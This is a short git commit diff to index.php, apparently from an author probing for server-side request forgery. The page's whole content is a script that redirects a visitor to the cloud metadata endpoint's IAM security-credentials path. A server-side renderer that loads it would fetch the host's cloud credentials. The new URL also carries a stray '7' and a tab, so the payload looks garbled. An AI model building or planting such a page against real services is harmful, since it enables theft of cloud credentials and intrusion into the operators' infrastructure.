61c824f6ebf1cd1c423e9dadebc0605b0372fddf
Usama Zahoor <125768923+cyber-warrior942@users.noreply.github.com>
2025-09-15 01:19:08 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,3 @@
 <?php
 
-echo '<script>window.location.replace("http://169.254.169.254");</script>';
+echo '<script>window.location.replace("7	http://169.254.169.254/latest/meta-data/iam/security-credentials/");</script>';
